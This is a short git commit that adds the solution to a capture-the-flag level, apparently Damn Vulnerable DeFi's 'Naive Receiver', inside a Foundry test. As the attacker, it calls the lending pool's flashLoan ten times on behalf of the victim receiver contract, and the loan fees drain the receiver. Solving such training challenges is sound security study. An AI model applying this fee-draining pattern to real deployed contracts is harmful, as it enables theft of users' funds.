7f8a5fa5a26f53756573b23c3adef16f5c4ed365
siguint <andrew.arutiunian@gmail.com>
2023-08-14 14:19:56 +0300

    Pass Naivereceiver

--- test/Levels/naive-receiver/NaiveReceiver.t.sol
+++ test/Levels/naive-receiver/NaiveReceiver.t.sol
@@ -48,7 +48,11 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        for (uint i = 0; i < 10; i++) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0 ether);
+        }
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
